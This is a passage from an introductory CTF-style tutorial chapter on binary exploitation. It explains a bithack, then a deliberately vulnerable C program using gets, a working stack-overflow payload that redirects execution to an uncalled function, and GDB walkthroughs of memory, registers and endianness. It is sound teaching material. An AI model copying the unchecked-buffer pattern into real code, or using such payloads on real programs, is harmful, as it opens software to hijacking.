<span class="tok-mi">0</span><span class="tok-w"> </span><span class="tok-o">^</span><span class="tok-w"> </span><span class="tok-mi">0</span><span class="tok-w"> </span><span class="tok-o">=</span><span class="tok-w"> </span><span class="tok-mi">0</span>
<span class="tok-mi">1</span><span class="tok-w"> </span><span class="tok-o">^</span><span class="tok-w"> </span><span class="tok-mi">1</span><span class="tok-w"> </span><span class="tok-o">=</span><span class="tok-w"> </span><span class="tok-mi">0</span>
<span class="tok-mi">0</span><span class="tok-w"> </span><span class="tok-o">^</span><span class="tok-w"> </span><span class="tok-mi">1</span><span class="tok-w"> </span><span class="tok-o">=</span><span class="tok-w"> </span><span class="tok-mi">1</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Now, we have y=5, x=9.Lets analyze each part of:</p>
                    </div>
                    <div class="paragraph">
                        <p>y ^ ( ( x ^ y ) &amp; - ( x &lt; y ) )</p>
                    </div>
                    <div class="paragraph">
                        <p>In the part highlighted in bold:</p>
                    </div>
                    <div class="paragraph">
                        <p>y ^ ( ( x ^ y ) &amp; - <strong>( x &lt; y )</strong> )</p>
                    </div>
                    <div class="paragraph">
                        <p>x &lt; y is false, in c false is represented as a 0, that in a byte would look like this:
                            00000000</p>
                    </div>
                    <div class="paragraph">
                        <p>-0, is 0, so it keeps being 00000000</p>
                    </div>
                    <div class="paragraph">
                        <p>So, -<strong>( x &lt; y )</strong> is 0. So far we would have</p>
                    </div>
                    <div class="paragraph">
                        <p>y ^ ( ( x ^ y ) &amp; <strong>0</strong> )</p>
                    </div>
                    <div class="paragraph">
                        <p>Now</p>
                    </div>
                    <div class="paragraph">
                        <p>y ^ ( <strong>(x^y)</strong> &amp; 0 )</p>
                    </div>
                    <div class="paragraph">
                        <p><strong>( x ^ y )</strong> &amp; 0 is 0 , because any value &amp; 0, is still 0</p>
                    </div>
                    <div class="paragraph">
                        <p>So we get to</p>
                    </div>
                    <div class="paragraph">
                        <p>y ^ ( <strong>0</strong> )</p>
                    </div>
                    <div class="paragraph">
                        <p>This is simply y ^ 0 , when you take any value and do XOR with zero, it is like doing
                            nothing!</p>
                    </div>
                    <div class="paragraph">
                        <p>So we get to <strong>y</strong> which is the smallest number (cool!!!!!!)</p>
                    </div>
                    <div class="paragraph">
                        <p>But what happens if the values of x and y are swapped, surely it will not still
                            print the smallest number? Swap the values in your code, compile and run it
                            again to see what happens!</p>
                    </div>
                    <div class="paragraph">
                        <p>That was amazing. That is a beautiful hack! It is actually called a bithack! In a computer,
                            this operation executes much faster than an "if" statement. In most of the programs you
                            don&#8217;t need to execute an operation that fast to comply with the functionality you
                            need, but in some cases that is needed.</p>
                    </div>
                    <div class="paragraph">
                        <p>Let&#8217;s say that a hack could be simply a clever thing. Now, what is an exploit?</p>
                    </div>
                    <div class="paragraph">
                        <p>It is an attack on a computer program. If a computer program has a vulnerability, a hacker
                            can take advantage of such a vulnerability to make the program do something different from
                            the original purpose of the program. Taking advantage of a vulnerability successfully, it is
                            called an exploit.</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_stack_overflow_attack">10.2. Stack overflow attack</h3>
                    <div class="paragraph">
                        <p>By this point you should already know how to use the terminal, compile programs and have some
                            understanding of C programming. Create the following program in the webshell, and name it
                            vuln1.c:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="c"><span></span><span class="tok-cp">#include</span><span class="tok-w"> </span><span class="tok-cpf">&lt;stdio.h&gt;</span>
<span class="tok-cp">#define BUFSIZE 4</span>
<span class="tok-kt">void</span><span class="tok-w"> </span><span class="tok-nf">win</span><span class="tok-p">()</span>
<span class="tok-p">{</span>
<span class="tok-w">    </span><span class="tok-n">puts</span><span class="tok-p">(</span><span class="tok-s">&quot;If I am printed, I was hacked! because the program never called me!&quot;</span><span class="tok-p">);</span>
<span class="tok-p">}</span>
<span class="tok-kt">void</span><span class="tok-w"> </span><span class="tok-nf">vuln</span><span class="tok-p">()</span>
<span class="tok-p">{</span>
<span class="tok-w">    </span><span class="tok-n">puts</span><span class="tok-p">(</span><span class="tok-s">&quot;Input a string and it will be printed back!&quot;</span><span class="tok-p">);</span>
<span class="tok-w">    </span><span class="tok-kt">char</span><span class="tok-w"> </span><span class="tok-n">buf</span><span class="tok-p">[</span><span class="tok-n">BUFSIZE</span><span class="tok-p">];</span>
<span class="tok-w">    </span><span class="tok-n">gets</span><span class="tok-p">(</span><span class="tok-n">buf</span><span class="tok-p">);</span>
<span class="tok-w">    </span><span class="tok-n">puts</span><span class="tok-p">(</span><span class="tok-n">buf</span><span class="tok-p">);</span>
<span class="tok-w">    </span><span class="tok-n">fflush</span><span class="tok-p">(</span><span class="tok-n">stdout</span><span class="tok-p">);</span>
<span class="tok-p">}</span>
<span class="tok-kt">int</span><span class="tok-w"> </span><span class="tok-nf">main</span><span class="tok-p">(</span><span class="tok-kt">int</span><span class="tok-w"> </span><span class="tok-n">argc</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-kt">char</span><span class="tok-w"> </span><span class="tok-o">**</span><span class="tok-n">argv</span><span class="tok-p">)</span>
<span class="tok-p">{</span>
<span class="tok-w">    </span><span class="tok-n">vuln</span><span class="tok-p">();</span>
<span class="tok-w">    </span><span class="tok-k">return</span><span class="tok-w"> </span><span class="tok-mi">0</span><span class="tok-p">;</span>
<span class="tok-p">}</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>You can see that the function win() is never called in the program. Therefore, the message
                            that it prints should never be printed. right?</p>
                    </div>
                    <div class="paragraph">
                        <p>Compile the program using:</p>
                    </div>
                    <div class="paragraph">
                        <p>gcc vuln1.c -o vuln1 -fno-stack-protector -no-pie</p>
                    </div>
                    <div class="paragraph">
                        <p>Now run the program using:</p>
                    </div>
                    <div class="paragraph">
                        <p>&#46;/vuln1</p>
                    </div>
                    <div class="paragraph">
                        <p>You can input a string, and it will print it back. For instance, if you input "HelloPicoCTF",
                            it should show:</p>
                    </div>
                    <div class="paragraph">
                        <p>Input a string and it will be printed back!</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="c"><span></span><span class="tok-n">HelloPicoCTF</span>
<span class="tok-n">HelloPicoCTF</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>The program did what it was written for. Now, we are going to send a particular string to the
                            program using python. You can run a single line of python in the command using the flag -c,
                            and enclosing the line of code between single quotes. In the terminal you can pass the
                            output of one command as the input to other command using the pipe, which is this character
                            "|". In the following command we are printing something in python, and passing that to the C
                            program we just compiled.</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="python"><span></span><span class="tok-n">python3</span> <span class="tok-o">-</span><span class="tok-n">c</span> <span class="tok-s1">&#39;print(&quot;hello world!&quot;)&#39;</span> <span class="tok-o">|./</span><span class="tok-n">vuln1</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>You should see "hello world!" printed back to the terminal right after the command. Note that
                            in python you can repeat the same character if you multiply it by a number, so 128*"A" is
                            simply a string composed by 128 "A" repeated. For example if you run:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="python"><span></span><span class="tok-n">python3</span> <span class="tok-o">-</span><span class="tok-n">c</span> <span class="tok-s1">&#39;print(10*&quot;A&quot;)&#39;</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>You should see the output:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="python"><span></span><span class="tok-n">AAAAAAAAAA</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Now we are going to send a string that is composed by 128 characters repeated, concatenated
                            to some bytes.</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="python"><span></span><span class="tok-n">python3</span> <span class="tok-o">-</span><span class="tok-n">c</span> <span class="tok-s1">&#39;print(128*&quot;A&quot;+&quot;</span><span class="tok-se">\x20\xe0\xff\xff\xff\x7f\x00\x00\xb7\x05\x40\x00</span><span class="tok-s1">&quot;)&#39;</span> <span class="tok-o">|./</span><span class="tok-n">vuln1</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>As result you will see:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="text"><span></span>If I am printed, I was hacked! because the program never called me!
Segmentation fault (core dumped)</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>What just happened? We simply sent a string, and a function that is never called in the
                            program was called We can send some particular input to the program to break it and make it
                            do something that we want. That "particular input" you send to a program in the security
                            jargon is called the "<strong>payload</strong>".</p>
                    </div>
                    <div class="paragraph">
                        <p>You just hacked a very simple binary. But&#8230;&#8203; what happened on the inside? Why? A
                            very rough explanation, is that when you call a function, the computer needs to know how to
                            come back to continue executing the code that called it after the function finishes its
                            execution. The address of the piece of code that you should continue on after the function
                            call (you do not see this in the source code), is called the return address. Since the
                            program is not checking the boundaries of the input in the C program we made, you can
                            overwrite the place in which the return address is stored! Lets understand that better so
                            you can manipulate similar exploits at your will.</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_what_you_need_to_know_for_a_binary_exploit">10.3. What you need to know for a binary
                        exploit</h3>
                    <div class="paragraph">
                        <p>The famous Stack Overflow is a type of Buffer Overflow, an anomaly that overwrites a memory
                            sector where it should not. It causes security problems by opening doors for malicious
                            actions to be executed. To understand it, it is necessary to have an idea of how the memory
                            of a computer works.</p>
                    </div>
                    <div class="sect3">
                        <h4 id="_memory">10.3.1. Memory</h4>
                        <div class="paragraph">
                            <p>RAM means "random access memory". It is called Random Access because you can access any
                                part of it directly, without having to pass first for other regions, as it was necessary
                                at some point in history. For example, computers used to have a magnetic tape in which
                                an item of data could only be accessed by starting from the beginning of the tape and
                                finding an address sequentially. In a RAM we can go to any part of it immediately!</p>
                        </div>
                        <div class="paragraph">
                            <p>Conceptually, a RAM is a grid with slots that can contain data. Let&#8217;s imagine we
                                have a RAM of only 5 slots. We could name each slot by a number, starting at 0, so it
                                would look like this:</p>
                        </div>
                        <div class="imageblock text-center">
                            <div class="content">
                                <img src="images/4image36.png" alt="image" width="198" height="222">
                            </div>
                            <div class="title">Figure 55. Imagined memory</div>
                        </div>
                        <div class="paragraph">
                            <p>Now, if we want to put the word "HELLO" in our imaginary memory, we could put each
                                character of "HELLO" in each slot, like this:</p>
                        </div>
                        <div class="imageblock text-center">
                            <div class="content">
                                <img src="images/4image37.png" alt="image" width="198" height="222">
                            </div>
                            <div class="title">Figure 56. Imagined memory containing 'HELLO'</div>
                        </div>
                        <div class="paragraph">
                            <p>The numbers we used to identify each slot of the memory are called addresses. If we ask:
                                what character is in the address 1? The answer would be the character E. A real memory
                                from a computer nowadays can have billions of addresses. Normally, addresses are shown
                                in hexadecimal. For example, the address "255" would normally be shown as "0xFF".</p>
                        </div>
                        <div class="paragraph">
                            <p>In a program, the memory is used in a certain way to be able to do all that the program
                                can do, and the program itself is present in memory when it is being executed. The
                                memory is organized in the following sections:</p>
                        </div>
                        <div class="paragraph">
                            <p>When we compile a C source code, this is converted to machine code also known as binary.
                                When a program is run, this machine code is placed in the code section. The code section
                                holds only machine code, not the source code we know from C for example. The machine
                                code is a set of instructions that the processor of a computer can understand. The
                                computer will execute the instructions sequentially and while doing that will access
                                other parts of memory to read data and output results.</p>
                        </div>
                        <div class="paragraph">
                            <p>A program has several sections, but for now, let&#8217;s keep in mind the following three
                                sections:</p>
                        </div>
                        <div class="ulist">
                            <ul>
                                <li>
                                    <p>Data section</p>
                                </li>
                                <li>
                                    <p>Heap</p>
                                </li>
                                <li>
                                    <p>Stack</p>
                                </li>
                            </ul>
                        </div>
                        <div class="paragraph">
                            <p>In the data section, static and global variables are placed. This variables always exist
                                when the program is being run, in contrast to local variables that disappear when a
                                function finishes and returns the result.</p>
                        </div>
                        <div class="paragraph">
                            <p>In the heap is placed the memory allocated dynamically. For example, when you use malloc
                                in C to allocate a buffer, that buffer is allocated on the heap. It is called dynamic
                                allocation because the program allocates memory when is already running and executing
                                the particular instruction for malloc. In the code you write you can also decide to
                                deallocate a buffer of memory that you previously allocated. So, it is called dynamic
                                because the programmer can allocate it and deallocate a chunk of memory of a desired
                                size.</p>
                        </div>
                        <div class="paragraph">
                            <p>In the Stack segment, are placed the local variables, function parameters and return
                                addresses. What is a return address? When we call a function, the address of the next
                                instruction has to be stored somewhere so the program knows where to comeback after the
                                function is finished. We call this address the "return address". A function can be
                                called in different parts of a program, so this return address will be different
                                depending on where the program calls the function.</p>
                        </div>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_example_of_execution_of_a_program">10.4. Example of Execution of a program</h3>
                    <div class="paragraph">
                        <p>The execution of a program and its memory is controlled by processor registers, usually
                            called simply registers. These are a very small and fast kind of memory that is attached to
                            the processor. A register can store 4 or 8 bytes, depending on the processor. A processor
                            only has a few registers. Depending on the kind of processor, the registers might differ.
                            But we will take a look at the ones that are generic to most processors and will let us
                            understand later the most common binary exploits.</p>
                    </div>
                    <div class="paragraph">
                        <p>To see a real example in action we can use GDB, a software that allows us to see the
                            execution of each part of a programs and its memory step by step. This kind of software is
                            called a debugger. When a binary program is running and we debug it, we can see in detail
                            what the program is doing in memory by analyzing the <strong>Assembly</strong>. What is the
                            Assembly? It is a low level language that can be used to show what each instruction from the
                            machine code does. GDB can generate assembly from the machine code in memory while we are
                            debugging the program so we can easily see what the machine code is doing.</p>
                    </div>
                    <div class="sect3">
                        <h4 id="_gdb_assembly_and_machine_code">10.4.1. GDB, Assembly and machine code</h4>
                        <div class="paragraph">
                            <p>In the webshell, GDB is already installed, so you can run</p>
                        </div>
                        <div class="listingblock">
                            <div class="content">
                                <pre
                                    class="pygments highlight"><code data-lang="text"><span></span>gdb ./vuln1</code></pre>
                            </div>
                        </div>
                        <div class="paragraph">
                            <p>You should see something like this:</p>
                        </div>
                        <div class="listingblock">
                            <div class="content">
                                <pre class="pygments highlight"><code data-lang="text"><span></span>GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law. Type &quot;show copying&quot;
and &quot;show warranty&quot; for details.
This GDB was configured as &quot;x86_64-linux-gnu&quot;.
Type &quot;show configuration&quot; for configuration details.
For bug reporting instructions, please see:
&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
Find the GDB manual and other documentation resources online at:
&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
For help, type &quot;help&quot;.
Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...
Reading symbols from vuln1...(no debugging symbols found)...done.
(gdb)</code></pre>
                            </div>
                        </div>
                        <div class="paragraph">
                            <p>Now, input "run" and press enter. Remember to press enter after using a command. The
                                program "vuln1" will be executed, so you can enter any string and it will print it back,
                                as it normally does the program "vuln1". You should see something like this if the
                                string you input is "HelloPicoCTF":</p>
                        </div>
                        <div class="listingblock">
                            <div class="content">
                                <pre class="pygments highlight"><code data-lang="text"><span></span>(gdb) run
Starting program: /vuln1
Input a string and it will be printed back!
HelloPicoCTF
HelloPicoCTF
[Inferior 1 (process 95000) exited normally]
(gdb)</code></pre>
                            </div>
                        </div>
                        <div class="paragraph">
                            <p>If you input "r" instead of "run", it will do the same because "r" is the GDB
                                abbreviation for "run". If you do the experiment you should see the same:</p>
                        </div>
                        <div class="listingblock">
                            <div class="content">
                                <pre class="pygments highlight"><code data-lang="text"><span></span>(gdb) r
Starting program: /vuln1
Input a string and it will be printed back!
HelloPicoCTF
HelloPicoCTF
[Inferior 1 (process 95000) exited normally]
(gdb)</code></pre>
                            </div>
                        </div>
                        <div class="paragraph">
                            <p>To exit from GDB, you can input "quit" and press enter. Also, you could input only "q"
                                and it will quit too. In several GDB commands, you can also input the first character of
                                the command, and GDB will understand.</p>
                        </div>
                        <div class="paragraph">
                            <p>Now, open GDB again to debug "vuln1" with the same command we used previously:</p>
                        </div>
                        <div class="listingblock">
                            <div class="content">
                                <pre
                                    class="pygments highlight"><code data-lang="text"><span></span>gdb ./vuln1</code></pre>
                            </div>
                        </div>
                        <div class="paragraph">
                            <p>But now, before running it using "run", we want to stop at the beginning of the function
                                "vuln()". To do this, you can set a breakpoint at vuln(). Setting a breakpoint, simply
                                means that the execution of the program will pause in the instruction you set the
                                breakpoint. By running "break vuln" or "b vuln", a breakpoint will be set at the
                                beginning of vuln. We will see this:</p>
                        </div>
                        <div class="listingblock">
                            <div class="content">
                                <pre class="pygments highlight"><code data-lang="text"><span></span>(gdb) b vuln
Breakpoint 1 at 0x4005ce</code></pre>
                            </div>
                        </div>
                        <div class="admonitionblock important">
                            <table>
                                <tr>
                                    <td class="icon">
                                        <i class="fa icon-important" title="Important"></i>
                                    </td>
                                    <td class="content">
                                        The addresses you see might be different, that is ok.
                                    </td>
                                </tr>
                            </table>
                        </div>
                        <div class="paragraph">
                            <p>What does it mean "Breakpoint 1 at 0x4005ce" ? Do you remember that there is a segment of
                                the memory in which the machine code is placed? In the memory address "0x4005ce" the
                                machine code of "vuln()" begins. Input "r" to start the execution of the program and you
                                will see:</p>
                        </div>
                        <div class="listingblock">
                            <div class="content">
                                <pre class="pygments highlight"><code data-lang="text"><span></span>(gdb) r
Starting program: /home/samuel/Desktop/problems/vuln1
Breakpoint 1, 0x00000000004005ce in vuln ()
(gdb)</code></pre>
                            </div>
                        </div>
                        <div class="paragraph">
                            <p>"Breakpoint 1, 0x00000000004005ce in vuln ()" means that the first break point we have
                                set, was established at address "0x00000000004005ce", which is the same address as
                                "0x4005ce"; An address is a number in this case, so zeros at the left cause no effect.
                                Note that in other cases, zeros at the left can have an effect if what we are reading is
                                not being interpreted as a number.</p>
                        </div>
                        <div class="sect4">
                            <h5 id="_processor_registers">Processor registers</h5>
                            <div class="paragraph">
                                <p>A program is made up of several instructions that are executed sequentially. The
                                    processor of the computer has an integrated and very small memory different from
                                    RAM, called the "registers". A processor only has a few registers. Each register can
                                    hold only 8 bytes in a 64 bit processor, and 4 bytes in a 32 bit processor. A 32 bit
                                    program can run on a 64 bit processor, but 64 bit program cannot run on a 32 bit
                                    processor. One of the registers is called the Instruction Pointer, abbreviated as
                                    IP, that keeps track of the part of the program that is currently being executed. In
                                    a 64 bit program, we can print the value of this register in GDB using "x $rip":</p>
                            </div>
                            <div class="listingblock">
                                <div class="content">
                                    <pre class="pygments highlight"><code data-lang="text"><span></span>(gdb) x $rip
0x4005ce &lt;vuln+4&gt;: 0x80c48348
(gdb)</code></pre>
                                </div>
                            </div>
                            <div class="paragraph">
                                <p>Note that the first part of the line shown is "0x4005ce", this is exactly where the
                                    breakpoint was placed, so the IP naturally has that value because we made the
                                    program pause there. Then we have "&lt;vuln+4&gt;", do you remember we said that by
                                    setting a breakpoint at a function it would pause at the beginning of the function?
                                    To be more precise, a breakpoint on a function is usually placed 4 bytes after the
                                    beginning of the machine code of what is considered the function. Thats why the
                                    "+4". Later we will understand why its done like this. The remaining part,
                                    "0x80c48348", is the actual content at the address "0x4005ce". That content is a
                                    part of the machine code of the "vuln()" function.</p>
                            </div>
                            <div class="paragraph">
                                <p>To show the whole machine code of the function, showing each instruction on each
                                    address and its machine code, we can run "disas /r":</p>
                            </div>
                            <div class="listingblock">
                                <div class="content">
                                    <pre class="pygments highlight"><code data-lang="assembly"><span></span>(gdb) disas /r
Dump of assembler code for function vuln:
0x4005ca &lt;+0&gt;: 55    push %rbp
0x4005cb &lt;+1&gt;: 48 89 e5    mov %rsp,%rbp
=&gt; 0x4005ce &lt;+4&gt;: 48 83 c4 80    add $0xffffffffffffff80,%rsp
0x4005d2 &lt;+8&gt;: 48 8d 3d 27 01 00 00    lea 0x127(%rip),%rdi
0x4005d9 &lt;+15&gt;: e8 c2 fe ff ff    callq 0x4004a0 &lt;puts@plt&gt;
0x4005de &lt;+20&gt;: 48 8d 45 80    lea -0x80(%rbp),%rax
0x4005e2 &lt;+24&gt;: 48 89 c7 mov    %rax,%rdi
0x4005e5 &lt;+27&gt;: b8 00 00 00 00    mov $0x0,%eax
0x4005ea &lt;+32&gt;: e8 c1 fe ff ff    callq 0x4004b0 &lt;gets@plt&gt;
0x4005ef &lt;+37&gt;: 48 8d 45 80    lea -0x80(%rbp),%rax
0x4005f3 &lt;+41&gt;: 48 89 c7    mov %rax,%rdi
0x4005f6 &lt;+44&gt;: e8 a5 fe ff ff    callq 0x4004a0 &lt;puts@plt&gt;
0x4005fb &lt;+49&gt;: 48 8b 05 3e 0a 20 00    mov 0x200a3e(%rip),%rax
0x400602 &lt;+56&gt;: 48 89 c7    mov %rax,%rdi
0x400605 &lt;+59&gt;: e8 b6 fe ff ff    callq 0x4004c0 &lt;fflush@plt&gt;
0x40060a &lt;+64&gt;: 90    nop
0x40060b &lt;+65&gt;: c9    leaveq
0x40060c &lt;+66&gt;: c3    retq
End of assembler dump.
(gdb)</code></pre>
                                </div>
                            </div>
                            <div class="paragraph">
                                <p>Each line of what was just printed by GDB is organized in three parts. Lets analyze
                                    the following line to introduced machine code and assembly:</p>
                            </div>
                            <div class="paragraph">
                                <p>0x400602 &lt;+56&gt;: 48 89 c7 mov %rax,%rdi</p>
                            </div>
                            <div class="paragraph">
                                <p>The left part is the address "0x400602 &lt;+56&gt;". After the address some spaces
                                    are shown, then in the middle we find the machine code, that in this case is "48 89
                                    c7". After some other spaces, we find the Assembly, which is "mov %rax,%rdi".
                                    Assembly is a low level language that can be directly mapped to the machine code.
                                    Thats why GDB can see some machine code in the memory and print for us the assembly
                                    that represents. A specific sequence of bytes in the machine code maps to an
                                    instruction of assembly. So, when a program is running and in memory is seen the
                                    sequence of bytes "48 89 c7" in the code segment, the computer knows that is some
                                    specific instruction and the processor has to do a specific action. Right now the
                                    intention is not to explain assembly in detail, but just for the sake of this
                                    example, know that "mov %rax,%rdi" moves the value of the register "rax" into the
                                    register "rdi". While the program is being executed by going forward in the code
                                    section of memory where the machine code is located, and it appears the sequence of
                                    bytes "48 89 c7", the processor knows that it has to copy the register "rax" into
                                    "rdi". Note that in the function, there are two parts in which appears the machine
                                    code "48 89 c7" and both have the same assembly.</p>
                            </div>
                            <div class="paragraph">
                                <p>Now, in this line:</p>
                            </div>
                            <div class="paragraph">
                                <p><strong>&#8658;</strong> 0x4005ce &lt;+4&gt;: 48 83 c4 80 add
                                    $0xffffffffffffff80,%rsp</p>
                            </div>
                            <div class="paragraph">
                                <p>do you see the arrow "&#8658;" at the left? That indicates the instruction in which
                                    we are. Next to it there is an address, that as expected, has the same value as the
                                    Instruction Pointer. Then there is the &lt;+4&gt; which we already explained,
                                    followed by the machine code "48 83 c4 80" at the address 0x4005ce Hold on, what is
                                    going on? A few paragraphs ago we said that the machine code at that address was "
                                    0x 80 c4 83 48" when we printed the Instruction Pointer using "x $rip". But now we
                                    say it is "48 83 c4 80". If you look closely, these are the same bytes but
                                    backwards. Lets take advantage of this opportunity to explain "little endian".</p>
                            </div>
                        </div>
                        <div class="sect4">
                            <h5 id="_19_2_1_3_little_endian">19.2.1.3 Little endian</h5>
                            <div class="paragraph">
                                <p>In most of the computers we use in everyday life, the numbers are interpreted as
                                    little endian. So when you read this from memory:</p>
                            </div>
                            <div class="paragraph">
                                <p><strong>48 83 c4 80</strong></p>
                            </div>
                            <div class="paragraph">
                                <p>It will be interpreted and shown as this:</p>
                            </div>
                            <div class="paragraph">
                                <p><strong>80 c4 83 48</strong></p>
                            </div>
                            <div class="paragraph">
                                <p>This is the case only for numbers. Addresses are numbers. In an attack when you want
                                    to overwrite an address, you have to consider this and input the bytes of the
                                    address backwards so they are interpreted in the correct manner. Why do computers do
                                    this? There are some reasons and consequences. In fact there are also reasons for
                                    using "big endian" which is using the bytes without inverting them. One argument
                                    commonly given for supporting little endian, is that some operations are easier to
                                    do. For instance, if you have a number, lets say 255 in decimal, it would be 0xff
                                    in hexadecimal. If the number is contained in a variable type that takes 4 bytes,
                                    for example an "int" in C, it would look like this in memory:</p>
                            </div>
                            <div class="paragraph">
                                <p>ff 00 00 00</p>
                            </div>
                            <div class="paragraph">
                                <p>Then, you want to cast it to a type that only takes two bytes, for example a "short"
                                    in C. In memory, you can leave the same value without having to move anything, and
                                    the "short" would look like this:</p>
                            </div>
                            <div class="paragraph">
                                <p>ff 00</p>
                            </div>
                            <div class="paragraph">
                                <p>Now, imagine that we were not using little endian. The type "int" would hold the
                                    number like this:</p>
                            </div>
                            <div class="paragraph">
                                <p>00 00 00 ff</p>
                            </div>
                            <div class="paragraph">
                                <p>And the "short" like this:</p>
                            </div>
                            <div class="paragraph">
                                <p>00 ff</p>
                            </div>
                            <div class="paragraph">
                                <p>Note that we had to move the ff, which originally was on the fourth byte, and now it
                                    is in the second byte.</p>
                            </div>
                            <div class="paragraph">
                                <p>In summary, what you should remember for binary exploits, is that if you want to
                                    write a number into memory, you have to write its bytes backwards. Also, remember
                                    that this is only for numbers. In a hypothetical situation if you want to place in
                                    memory the string "HELLO", you can put it in its original order.</p>
                            </div>
                            <div class="paragraph">
                                <p>In GDB is possible to show a chunk of memory at a specific location using a command
                                    such as "x/16xw 0x4005da". This will print 16 words after the address 0x4005da. A
                                    word in a 64 bit processor, has 8 bytes, so that command is going to print 64 bytes.
                                    Run the command yourself! You should see something like this:</p>
                            </div>
                            <div class="listingblock">
                                <div class="content">
                                    <pre class="pygments highlight"><code data-lang="assembly"><span></span>(gdb) x/16xw 0x4005ce
0x4005ce &lt;vuln+4&gt;: 0x80c48348 0x273d8d48 0xe8000001 0xfffffec2
0x4005de &lt;vuln+20&gt;: 0x80458d48 0xb8c78948 0x00000000 0xfffec1e8
0x4005ee &lt;vuln+36&gt;: 0x458d48ff 0xc7894880 0xfffea5e8 0x058b48ff
0x4005fe &lt;vuln+52&gt;: 0x00200a3e 0xe8c78948 0xfffffeb6 0x55c3c990
(gdb)</code></pre>
                                </div>
                            </div>
                            <div class="paragraph">
                                <p>Note that GDB prints each group of 4 bytes as a numbers. Because of little endianess,
                                    each of those groups of 4 bytes, is reversed in memory. When using the previous
                                    command, no matter what is inside the memory, everything will be printed in reverse
                                    for each group of 4 bytes.</p>
                            </div>
                        </div>
                        <div class="sect4">
                            <h5 id="_function_call">Function call</h5>
                            <div class="paragraph">
                                <p>When a function is called, the IP moves to wherever the code of the function is
                                    located. When the function is finished, the IP moves back to the next instruction to
                                    the function call. As we mentioned previously, the address of the next instruction
                                    has to be stored somewhere so the program knows where to comeback after the function
                                    is finished. We call this address the "return address". The return address is stored
                                    in the memory segment refered as the stack. How do we know in which part of the
                                    stack? There is a register called the Stack Pointer (SP), that points to the tip of
                                    the stack. When a function is called, the stack pointer moves to make room for the
                                    return address and new local variables. When the function is finished, the Stack
                                    Pointer moves to the original position prior to the function call, making the memory
                                    addresses in which the local variables from the function were located free again.
                                </p>
                            </div>
                            <div class="paragraph">
                                <p>Imagine that we have a toy memory with only a few addresses. Remember that the SP is
                                    the Stack Pointer, and the Stack is a region of memory, in this case colored in
                                    yellow. Suppose that we have created no local variables or anything on the stack.
                                    The stack would look like this:</p>
                            </div>
                            <div class="imageblock text-center">
                                <div class="content">
                                    <img src="images/6image1.png" alt="image" width="198" height="222">
                                </div>
                                <div class="title">Figure 57. Stack</div>
                            </div>
                            <div class="paragraph">
                                <p>Then we create a local variable, using something like:</p>
                            </div>
                            <div class="listingblock">
                                <div class="content">
                                    <pre
                                        class="pygments highlight"><code data-lang="c"><span></span><span class="tok-kt">int</span><span class="tok-w"> </span><span class="tok-n">var</span><span class="tok-o">=</span><span class="tok-mi">4</span><span class="tok-p">;</span></code></pre>
                                </div>
                            </div>
                            <div class="paragraph">
                                <p>After that is executed, the stack would look like in the following image, because by
                                    creating a variable we push it into the stack (in this example we are using
                                    &#8656; as a simple arrow):</p>
                            </div>
                            <div class="imageblock text-center">
                                <div class="content">
                                    <img src="images/6image2.png" alt="image" width="198" height="222">
                                </div>
                                <div class="title">Figure 58. Stack after pushing 4</div>
                            </div>
                            <div class="paragraph">
                                <p>Note that when we push a variable into the stack, we subtract one address to the SP,
                                    so it points to the new top of the stack. In this case the new SP value will be 16,
                                    which means is pointing to the address 16. If we create another local variable like
                                    this:</p>
                            </div>
                            <div class="listingblock">
                                <div class="content">
                                    <pre
                                        class="pygments highlight"><code data-lang="c"><span></span><span class="tok-kt">int</span><span class="tok-w"> </span><span class="tok-n">var</span><span class="tok-o">=</span><span class="tok-mi">5</span><span class="tok-p">;</span></code></pre>
                                </div>
                            </div>
                            <div class="paragraph">
                                <p>The stack would look like this:</p>
                            </div>
                            <div class="imageblock text-center">
                                <div class="content">
                                    <img src="images/6image3.png" alt="image" width="198" height="222">
                                </div>
                                <div class="title">Figure 59. Stack after pushing 4 and 5</div>
                            </div>
                            <div class="paragraph">
                                <p>And the SP would be equal to 15.</p>
                            </div>
                            <div class="paragraph">
                                <p>In real life, on a 32 bit Intel architecture, each address contains four bytes.
                                    Integers are stored in little endian, and the addresses would have bigger values on
                                    a running program because the stack is placed on higher addresses. A piece of the
                                    stack that created two integer with values 5 and 4, could look like this (remember
                                    that address and memory are usually represented in hex):</p>
                            </div>
                            <div class="imageblock text-center">
                                <div class="content">
                                    <img src="images/6image4.png" alt="image" width="198" height="222">
                                </div>
                                <div class="title">Figure 60. More realistic Stack after pushing 4 and 5</div>
                            </div>
                            <div class="paragraph">
                                <p>Lets go now to real life on our 64 bit program.</p>
                            </div>
                            <div class="paragraph">
                                <p>In GDB, set a breakpoint in the function "main" using "b main":</p>
                            </div>
